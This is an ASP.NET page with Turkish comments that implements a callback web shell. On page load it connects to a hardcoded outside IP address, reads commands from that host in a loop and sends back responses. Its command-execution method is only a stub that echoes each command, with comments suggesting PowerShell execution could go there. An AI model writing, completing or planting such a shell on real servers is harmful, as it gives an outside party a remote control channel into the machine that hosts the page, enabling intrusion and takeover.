<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        String host = "45.67.228.28"; // Hedef sunucu IP adresi
        int port = 80; // Hedef sunucu portu

        CallbackShell(host, port);
    }

    protected void CallbackShell(string server, int port)
    {
        TcpClient client = new TcpClient(server, port);
        NetworkStream stream = client.GetStream();

        StreamReader reader = new StreamReader(stream);
        StreamWriter writer = new StreamWriter(stream);

        writer.AutoFlush = true;

        // Gelen veriyi okumak için bir döngü
        while (true)
        {
            string data = reader.ReadLine();

            if (data == null)
                break;

            // Veriyi işleyin veya yanıt olarak gönderin
            string response = ExecuteCommand(data);
            writer.WriteLine(response);
        }

        client.Close();
    }

    protected string ExecuteCommand(string command)
    {
        // Burada gelen komutları işleyebilirsiniz
        // Örneğin: PowerShell komutları çalıştırabilir veya başka işlemler yapabilirsiniz
        return "Komut çalıştırıldı: " + command;
    }
</script>
